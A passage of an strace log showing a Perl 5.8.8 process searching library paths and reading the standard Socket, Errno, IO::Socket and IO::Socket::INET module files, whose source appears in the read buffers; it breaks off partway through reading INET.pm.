10195 07:31:50.956864 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.956893 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956905 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.956920 stat64("/usr/lib/perl5/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956932 stat64("/usr/lib/perl5/Socket.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.956945 stat64("/usr/share/perl5/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956957 stat64("/usr/share/perl5/Socket.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.956971 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.956983 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
10195 07:31:50.957017 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.957031 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.957042 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.957060 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
10195 07:31:50.957563 brk(0x8239000)    = 0x8239000
10195 07:31:50.957926 read(8, "", 4096) = 0
10195 07:31:50.957942 close(8)          = 0
10195 07:31:50.958030 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10195 07:31:50.958055 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10195 07:31:50.958082 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
10195 07:31:50.958096 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
10195 07:31:50.958185 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
10195 07:31:50.958203 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d31000
10195 07:31:50.958217 mmap2(0xb7d36000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d36000
10195 07:31:50.958232 close(8)          = 0
10195 07:31:50.958853 brk(0x825a000)    = 0x825a000
10195 07:31:50.959017 stat64("/etc/perl/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959033 stat64("/etc/perl/Errno.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.959051 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959064 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.959079 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959091 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.959105 stat64("/usr/lib/perl5/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959117 stat64("/usr/lib/perl5/Errno.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.959130 stat64("/usr/share/perl5/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959142 stat64("/usr/share/perl5/Errno.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.959155 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.959168 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
10195 07:31:50.959188 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.959203 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.959214 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.959233 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
10195 07:31:50.960040 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
10195 07:31:50.974325 _llseek(8, 5966, [5966], SEEK_SET) = 0
10195 07:31:50.974386 _llseek(8, 0, [5966], SEEK_CUR) = 0
10195 07:31:50.974411 close(8)          = 0
10195 07:31:50.974768 brk(0x827b000)    = 0x827b000
10195 07:31:50.974954 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
10195 07:31:50.975445 _llseek(6, 6698, [6698], SEEK_SET) = 0
10195 07:31:50.975462 _llseek(6, 0, [6698], SEEK_CUR) = 0
10195 07:31:50.975473 close(6)          = 0
10195 07:31:50.975493 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975508 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.975522 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975536 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.975550 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975563 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.975577 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975589 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.975603 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975616 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.975629 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.975646 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
10195 07:31:50.975668 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.975683 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.975694 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.975712 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    